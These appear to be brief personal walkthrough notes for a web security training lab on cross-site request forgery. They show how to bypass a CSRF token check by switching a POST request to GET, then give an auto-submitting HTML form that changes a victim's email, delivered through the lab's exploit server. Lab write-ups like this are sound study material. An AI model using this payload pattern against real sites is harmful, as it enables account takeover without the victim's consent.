```bash
1. login: wiener user
2. update: email
3. send this request to the repaeter tab

TEST CASE
a. remove the csrf token  --  Missing parameter CSRF
b. change the csrf token to abcd1234  --  Invalid CSRF token

4. update the email while intercepting the request
5. send this request to the repeater drop all the request and turn off the intercept

6. change the POST parameter to GET and remove the csrf token
   GET /my-account/change-email?email=banana%40fake.com

7. Generate a CSRF PoC

CSRF PAYLOAD  --  update the email value

<!DOCTYPE html>
<html lang="en">
	<body>
		<form method="GET" action="https://lab-id.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="mango@fake.com">
			<input type="submit" value="Submit Request">
		</form>
	</body>
 <script>document.forms[0].submit();</script>
</html>


8. go to the exploit server deliver to the victim and done
9. NOTE if you viewed the exploit then update the email value.
```
